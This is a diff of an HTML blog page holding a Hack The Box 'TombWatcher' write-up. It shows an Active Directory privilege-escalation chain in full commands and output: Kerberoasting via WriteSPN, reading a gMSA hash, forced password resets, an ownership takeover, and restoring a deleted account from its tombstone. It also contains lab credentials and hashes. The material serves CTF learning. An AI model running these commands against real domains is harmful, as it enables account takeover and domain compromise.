+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/blogs/">
+                        Blogs
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/writeups/">
+                        Writeups
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="https://notes.chaelsoo.me">
+                        Cheatsheet
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">HTB: TombWatcher</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-06-06T00:00:00&#43;00:00" itemprop="datePublished"> 6 Jun 2026 </time>
+                </div>
+                
+            </header>
+            
+            <img src="/images/writeups/htb-tombwatcher/htb-tombwatcher-pwned.png" alt="HTB: TombWatcher" style="width:100%;border-radius:0.5rem;margin:1.5rem 0;" />
+            
+            <div class="toc-container">
+    <button class="toc-toggle" type="button" onclick="toggleToc()">Table of Contents</button>
+    <div class="toc-content" id="tocContent">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#acl-chain-to-john">ACL Chain to John</a>
+      <ul>
+        <li><a href="#1-writespn-on-alfred-then-kerberoast">1. WriteSPN on Alfred, then Kerberoast</a></li>
+        <li><a href="#2-alfred-adds-himself-to-infrastructure">2. Alfred Adds Himself to Infrastructure</a></li>
+        <li><a href="#3-read-ansible_devs-gmsa-password">3. Read ANSIBLE_DEV$&rsquo;s gMSA Password</a></li>
+        <li><a href="#4-forcechangepassword-on-sam">4. ForceChangePassword on Sam</a></li>
+        <li><a href="#5-writeowner-on-john">5. WriteOwner on John</a></li>
+      </ul>
+    </li>
+    <li><a href="#tombstone-reanimation">Tombstone Reanimation</a></li>
+    <li><a href="#esc15-via-cert_admin">ESC15 via cert_admin</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+<div class="mini-toc" id="miniToc">
+    <div class="mini-toc-header">
+        <div class="mini-toc-title">Contents</div>
+        <button class="mini-toc-minimize" type="button" onclick="toggleMiniToc()" aria-label="Minimize TOC">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1 8a.5.5 0 0 1 .5-.5h13a.5.5 0 0 1 0 1h-13A.5.5 0 0 1 1 8zM7.646 4.146a.5.5 0 0 1 .708 0l2 2a.5.5 0 0 1-.708.708L8.5 5.707V11.5a.5.5 0 0 1-1 0V5.707L6.354 6.854a.5.5 0 1 1-.708-.708l2-2z"/>
+            </svg>
+        </button>
+    </div>
+    <div class="mini-toc-content" id="miniTocContent"></div>
+</div>
+            <div class="page-content">
+                <p>Windows AD box with starting credentials. The box name is a hint you&rsquo;ll miss until it isn&rsquo;t. The first half is a clean BloodHound chain: five ACL hops from henry to john, each one mechanical. The second half is what makes this box worth remembering. John has a right most people have never used, Reanimate-Tombstones, and the ADCS OU he controls looks empty until you remember that AD doesn&rsquo;t actually delete objects immediately. The cert_admin account sitting in the deleted objects container has enrollment rights on a schema version 1 template, which is all you need for ESC15.</p>
+<h2 id="recon">Recon</h2>
+<p>10.129.232.167, domain <code>tombwatcher.htb</code>, DC hostname <code>DC01</code>. Standard AD stack, WinRM on 5985. Port 80 had the default IIS page.</p>
+<p>Starting credentials: <code>henry:H3nry_987TGV!</code>. No interesting shares:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span> -u henry -p <span class="s1">&#39;H3nry_987TGV!&#39;</span> --shares
+</span></span><span class="line"><span class="cl">SMB  DC01  <span class="o">[</span>+<span class="o">]</span> tombwatcher.htb<span class="se">\h</span>enry:H3nry_987TGV!
+</span></span><span class="line"><span class="cl">SMB  DC01  Share      Permissions
+</span></span><span class="line"><span class="cl">SMB  DC01  -----      -----------
+</span></span><span class="line"><span class="cl">SMB  DC01  ADMIN$
+</span></span><span class="line"><span class="cl">SMB  DC01  C$
+</span></span><span class="line"><span class="cl">SMB  DC01  IPC$       READ
+</span></span><span class="line"><span class="cl">SMB  DC01  NETLOGON   READ
+</span></span><span class="line"><span class="cl">SMB  DC01  SYSVOL     READ
+</span></span></code></pre></div><p>Collected BloodHound data straight away:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u henry -p <span class="s1">&#39;H3nry_987TGV!&#39;</span> --bloodhound -c All --dns-server <span class="nv">$DC</span>
+</span></span></code></pre></div><h2 id="acl-chain-to-john">ACL Chain to John</h2>
+<p>BloodHound showed the full picture immediately:</p>
+<p><img src="/images/writeups/htb-tombwatcher/bloodhound-full-chain.png" alt="BloodHound graph showing HENRY has WriteSPN on ALFRED, Alfred can AddSelf to INFRASTRUCTURE group, INFRASTRUCTURE has ReadGMSAPassword on ANSIBLE_DEV$, ANSIBLE_DEV$ has ForceChangePassword on SAM, SAM has WriteOwner on JOHN, and JOHN has GenericAll on the ADCS OU"></p>
+<p>That&rsquo;s one hell of a chain. Five hops to john, and GenericAll on the ADCS OU waiting at the end. The steps are each one command, let&rsquo;s get through them.</p>
+<h3 id="1-writespn-on-alfred-then-kerberoast">1. WriteSPN on Alfred, then Kerberoast</h3>
+<p>WriteSPN lets you add a Service Principal Name to any account you have that right over. An account with a SPN becomes kerberoastable. The KDC will issue a TGS ticket encrypted with that account&rsquo;s NT hash. No SPN needs to exist beforehand; write a fake one and it&rsquo;s immediately roastable:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -u henry -p <span class="s1">&#39;H3nry_987TGV!&#39;</span> -d tombwatcher.htb --host <span class="nv">$DC</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  <span class="nb">set</span> object Alfred servicePrincipalName -v <span class="s2">&#34;fake/spn.tombwatcher.htb&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Alfred<span class="err">&#39;</span>s servicePrincipalName has been updated
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">faketime -f <span class="s1">&#39;+4h&#39;</span> GetUserSPNs.py tombwatcher.htb/henry:<span class="s1">&#39;H3nry_987TGV!&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -dc-ip <span class="nv">$DC</span> -request
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ServicePrincipalName      Name    MemberOf  PasswordLastSet             LastLogon  Delegation
+</span></span><span class="line"><span class="cl">------------------------  ------  --------  --------------------------  ---------  ----------
+</span></span><span class="line"><span class="cl">fake/spn.tombwatcher.htb  Alfred            2025-05-12 16:17:03.526670  &lt;never&gt;
+</span></span></code></pre></div><p><em>The <code>faketime +4h</code> is needed because of a four-hour clock skew between my machine and the DC. Kerberos rejects tickets more than five minutes off.</em></p>
+<p>Cracked: <code>alfred:basketball</code>.</p>
+<h3 id="2-alfred-adds-himself-to-infrastructure">2. Alfred Adds Himself to Infrastructure</h3>
+<p>AddSelf is a specific ACL right that lets an account add itself to a group without needing WriteMember over other accounts:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -u alfred -p <span class="s1">&#39;basketball&#39;</span> -d tombwatcher.htb --host <span class="nv">$DC</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  add groupMember <span class="s2">&#34;Infrastructure&#34;</span> alfred
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> alfred added to Infrastructure
+</span></span></code></pre></div><h3 id="3-read-ansible_devs-gmsa-password">3. Read ANSIBLE_DEV$&rsquo;s gMSA Password</h3>
+<p>Group Managed Service Accounts have passwords the DC auto-rotates on a schedule. The current NT hash is stored as the <code>msDS-ManagedPassword</code> attribute on the computer object, readable over LDAP by members of the designated group, here Infrastructure:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -u alfred -p <span class="s1">&#39;basketball&#39;</span> -d tombwatcher.htb --host <span class="nv">$DC</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  get object <span class="s1">&#39;ansible_dev$&#39;</span> --attr msDS-ManagedPassword
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">distinguishedName: <span class="nv">CN</span><span class="o">=</span>ansible_dev,CN<span class="o">=</span>Managed Service Accounts,DC<span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">msDS-ManagedPassword.NT: cba56cd2df7d642f622e2a59956f6d47
+</span></span><span class="line"><span class="cl">msDS-ManagedPassword.B64ENCODED: mfN6zpVwyTpoirhbjkl6QrRJVzGohXxRem98/IxOBHXUQ85SDNU5VgvC3uXsQB/C6pbTxd7aibpSAqrOM1eSd...
+</span></span></code></pre></div><h3 id="4-forcechangepassword-on-sam">4. ForceChangePassword on Sam</h3>
+<p>ANSIBLE_DEV$ has this right over Sam, reset the password without knowing the current one:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -u <span class="s1">&#39;ansible_dev$&#39;</span> -p <span class="s1">&#39;:cba56cd2df7d642f622e2a59956f6d47&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -d tombwatcher.htb --host <span class="nv">$DC</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  <span class="nb">set</span> password sam <span class="s1">&#39;Kanyo123!&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Password changed successfully!
+</span></span></code></pre></div><h3 id="5-writeowner-on-john">5. WriteOwner on John</h3>
+<p>This is a three-step abuse. Sam has WriteOwner over John&rsquo;s object. Ownership in AD controls the DACL. The owner can modify permission entries on the object. So: take ownership, grant yourself GenericAll, reset the password:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -u sam -p <span class="s1">&#39;Kanyo123!&#39;</span> -d tombwatcher.htb --host <span class="nv">$DC</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  <span class="nb">set</span> owner <span class="s1">&#39;CN=john,CN=Users,DC=tombwatcher,DC=htb&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">             <span class="s1">&#39;CN=sam,CN=Users,DC=tombwatcher,DC=htb&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by
+</span></span><span class="line"><span class="cl">    <span class="nv">CN</span><span class="o">=</span>sam,CN<span class="o">=</span>Users,DC<span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb on <span class="nv">CN</span><span class="o">=</span>john,CN<span class="o">=</span>Users,DC<span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -u sam -p <span class="s1">&#39;Kanyo123!&#39;</span> -d tombwatcher.htb --host <span class="nv">$DC</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  add genericAll <span class="s1">&#39;CN=john,CN=Users,DC=tombwatcher,DC=htb&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">                 <span class="s1">&#39;CN=sam,CN=Users,DC=tombwatcher,DC=htb&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> <span class="nv">CN</span><span class="o">=</span>sam,CN<span class="o">=</span>Users,DC<span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb has now GenericAll on
+</span></span><span class="line"><span class="cl">    <span class="nv">CN</span><span class="o">=</span>john,CN<span class="o">=</span>Users,DC<span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -u sam -p <span class="s1">&#39;Kanyo123!&#39;</span> -d tombwatcher.htb --host <span class="nv">$DC</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  <span class="nb">set</span> password john <span class="s1">&#39;Kanyo123!&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Password changed successfully!
+</span></span></code></pre></div><p>John is in Remote Management Users. WinRM works, user flag on his desktop.</p>
+<p><img src="/images/writeups/htb-tombwatcher/bloodhound-john-remote-management.png" alt="BloodHound graph showing JOHN@TOMBWATCHER.HTB is MemberOf Remote Management Users and Domain Users groups"></p>
+<h2 id="tombstone-reanimation">Tombstone Reanimation</h2>
+<p>We&rsquo;ve reached the ADCS OU, which is what the GenericAll was pointing at. First thing I did was check what&rsquo;s actually in it:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -x -H ldap://<span class="nv">$DC</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -D <span class="s2">&#34;john@tombwatcher.htb&#34;</span> -w <span class="s1">&#39;Kanyo123!&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -b <span class="s1">&#39;OU=ADCS,DC=tombwatcher,DC=htb&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  <span class="s1">&#39;(objectClass=*)&#39;</span> dn objectClass
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># ADCS, tombwatcher.htb</span>
+</span></span><span class="line"><span class="cl">dn: <span class="nv">OU</span><span class="o">=</span>ADCS,DC<span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">objectClass: top
+</span></span><span class="line"><span class="cl">objectClass: organizationalUnit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># numEntries: 1</span>
+</span></span></code></pre></div><p>Empty. GenericAll over an empty OU is useless for object takeover. I ran PowerView to see what other rights john might have that BloodHound didn&rsquo;t surface:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Find-InterestingDomainAcl -ResolveGUIDs <span class="p">|</span> Where-Object <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$_</span>.IdentityReferenceName -match <span class="s2">&#34;john&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ObjectDN                : <span class="nv">DC</span><span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">AceQualifier            : AccessAllowed
+</span></span><span class="line"><span class="cl">ActiveDirectoryRights   : ExtendedRight
+</span></span><span class="line"><span class="cl">ObjectAceType           : Reanimate-Tombstones
+</span></span><span class="line"><span class="cl">AceFlags                : None
+</span></span><span class="line"><span class="cl">AceType                 : AccessAllowedObject
+</span></span><span class="line"><span class="cl">InheritanceFlags        : None
+</span></span><span class="line"><span class="cl">IdentityReferenceName   : john
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ObjectDN                : <span class="nv">OU</span><span class="o">=</span>ADCS,DC<span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">AceQualifier            : AccessAllowed
+</span></span><span class="line"><span class="cl">ActiveDirectoryRights   : GenericAll
+</span></span><span class="line"><span class="cl">ObjectAceType           : None
+</span></span><span class="line"><span class="cl">AceFlags                : ContainerInherit
+</span></span><span class="line"><span class="cl">AceType                 : AccessAllowed
+</span></span><span class="line"><span class="cl">InheritanceFlags        : ContainerInherit
+</span></span><span class="line"><span class="cl">IdentityReferenceName   : john
+</span></span></code></pre></div><p>Two rights: Reanimate-Tombstones on the domain root, and GenericAll with <code>ContainerInherit</code> on the ADCS OU. That combination is the entire box.</p>
+<p>When an AD object is deleted, it doesn&rsquo;t disappear. It becomes a tombstone:</p>
+<p><img src="/images/writeups/htb-tombwatcher/ad-tombstone-lifecycle-diagram.png" alt="Diagram showing AD object lifecycle: Live Object becomes Logically Deleted Object (restorable during msDS-deletedObjectLifetime window), then becomes Recycled Object (cannot restore), then Physically Deleted Object after tombstoneLifetime expires"></p>
+<p>The object is moved to <code>CN=Deleted Objects</code>, most attributes are stripped, and <code>isDeleted=TRUE</code> is set. The SID, GUID, <code>lastKnownParent</code>, and a handful of other attributes survive intact. For a configurable retention window (default 180 days), the object is recoverable. Reanimate-Tombstones is the extended right that lets you pull it back, clearing <code>isDeleted</code>, moving it back to <code>lastKnownParent</code>, and restoring it with its original SID.</p>
+<p>Querying the deleted objects container with the <code>1.2.840.113556.1.4.417</code> control (which instructs the DC to include deleted objects in the response):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -x -H ldap://<span class="nv">$DC</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -D <span class="s2">&#34;john@tombwatcher.htb&#34;</span> -w <span class="s1">&#39;Kanyo123!&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -b <span class="s1">&#39;DC=tombwatcher,DC=htb&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -E <span class="s1">&#39;!1.2.840.113556.1.4.417&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  <span class="s1">&#39;(isDeleted=TRUE)&#39;</span> dn sAMAccountName objectClass lastKnownParent memberOf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># cert_admin DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3</span>
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>cert_admin<span class="se">\0</span>ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,
+</span></span><span class="line"><span class="cl">    <span class="nv">CN</span><span class="o">=</span>Deleted Objects,DC<span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">objectClass: user
+</span></span><span class="line"><span class="cl">sAMAccountName: cert_admin
+</span></span><span class="line"><span class="cl">lastKnownParent: <span class="nv">OU</span><span class="o">=</span>ADCS,DC<span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb
+</span></span></code></pre></div><p>The ADCS OU was never actually empty. <code>cert_admin</code> used to live in it and was deleted. Restoring it puts it back under <code>OU=ADCS</code>, and because John&rsquo;s GenericAll ACE has <code>ContainerInherit</code>, he automatically gets GenericAll on cert_admin the moment it lands there.</p>
+<p>I restored it by sAMAccountName first:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -u john -p <span class="s1">&#39;Kanyo123!&#39;</span> -d tombwatcher.htb --host <span class="nv">$DC</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  <span class="nb">set</span> restore <span class="s1">&#39;cert_admin&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> cert_admin has been restored successfully under
+</span></span><span class="line"><span class="cl">    <span class="nv">CN</span><span class="o">=</span>cert_admin,OU<span class="o">=</span>ADCS,DC<span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb
+</span></span></code></pre></div><p>Then ran certipy to enumerate certificate templates and found the WebServer template had an enrollment rights entry with an unresolved SID:</p>
+<pre tabindex="0"><code>Enrollment Rights : TOMBWATCHER.HTB\Domain Admins
                     TOMBWATCHER.HTB\Enterprise Admins
                     S-1-5-21-1392491010-1358638721-2126982587-1111
-</code></pre><p>That SID didn&rsquo;t resolve to cert_admin. The issue: I restored the object by sAMAccountName, which grabbed whichever tombstone came first. The template&rsquo;s enrollment rights reference a specific SID (ending in <code>-1111</code>). The object I restored had a different SID:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bloodyAD -u john -p <span class=s1>&#39;Kanyo123!&#39;</span> -d tombwatcher.htb --host <span class=nv>$DC</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  get object cert_admin --attr objectSid
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>objectSid: S-1-5-21-1392491010-1358638721-2126982587-1109
-</span></span></code></pre></div><p>Wrong one. There were multiple <code>cert_admin</code> tombstones. Querying the deleted objects container again for all remaining tombstones and their SIDs:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ldapsearch -x -H ldap://<span class=nv>$DC</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  -D <span class=s2>&#34;john@tombwatcher.htb&#34;</span> -w <span class=s1>&#39;Kanyo123!&#39;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  -b <span class=s1>&#39;CN=Deleted Objects,DC=tombwatcher,DC=htb&#39;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  -E <span class=s1>&#39;!1.2.840.113556.1.4.417&#39;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  <span class=s1>&#39;(isDeleted=TRUE)&#39;</span> dn sAMAccountName objectSid lastKnownParent
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c1># cert_admin DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358</span>
-</span></span><span class=line><span class=cl>dn: <span class=nv>CN</span><span class=o>=</span>cert_admin<span class=se>\0</span>ADEL:c1f1f0fe-...
-</span></span><span class=line><span class=cl>sAMAccountName: cert_admin
-</span></span><span class=line><span class=cl>objectSid:: AQUAAAAAAAUVAAAAArr/UoEu+1C7Lcd+VgQAAA<span class=o>==</span>
-</span></span><span class=line><span class=cl>lastKnownParent: <span class=nv>OU</span><span class=o>=</span>ADCS,DC<span class=o>=</span>tombwatcher,DC<span class=o>=</span>htb
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c1># cert_admin DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf</span>
-</span></span><span class=line><span class=cl>dn: <span class=nv>CN</span><span class=o>=</span>cert_admin<span class=se>\0</span>ADEL:938182c3-...
-</span></span><span class=line><span class=cl>sAMAccountName: cert_admin
-</span></span><span class=line><span class=cl>objectSid:: AQUAAAAAAAUVAAAAArr/UoEu+1C7Lcd+VwQAAA<span class=o>==</span>
-</span></span><span class=line><span class=cl>lastKnownParent: <span class=nv>OU</span><span class=o>=</span>ADCS,DC<span class=o>=</span>tombwatcher,DC<span class=o>=</span>htb
-</span></span></code></pre></div><p>The base64-encoded SIDs decode to RIDs 1110 and 1111 respectively. The second one is the match. Delete the incorrectly restored object and restore by SID this time:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bloodyAD -u john -p <span class=s1>&#39;Kanyo123!&#39;</span> -d tombwatcher.htb --host <span class=nv>$DC</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  remove object <span class=s1>&#39;CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb&#39;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=nv>CN</span><span class=o>=</span>cert_admin,OU<span class=o>=</span>ADCS,DC<span class=o>=</span>tombwatcher,DC<span class=o>=</span>htb has been removed
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>bloodyAD -u john -p <span class=s1>&#39;Kanyo123!&#39;</span> -d tombwatcher.htb --host <span class=nv>$DC</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  <span class=nb>set</span> restore <span class=s1>&#39;S-1-5-21-1392491010-1358638721-2126982587-1111&#39;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> S-1-5-21-1392491010-1358638721-2126982587-1111 has been restored successfully
-</span></span><span class=line><span class=cl>    under <span class=nv>CN</span><span class=o>=</span>cert_admin,OU<span class=o>=</span>ADCS,DC<span class=o>=</span>tombwatcher,DC<span class=o>=</span>htb
-</span></span></code></pre></div><p>Certipy now resolved the SID to <code>cert_admin</code>. GenericAll from the OU ACE inherits immediately. Reset cert_admin&rsquo;s password directly:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bloodyAD -u john -p <span class=s1>&#39;Kanyo123!&#39;</span> -d tombwatcher.htb --host <span class=nv>$DC</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  <span class=nb>set</span> password cert_admin <span class=s1>&#39;Kanyo123!&#39;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Password changed successfully!
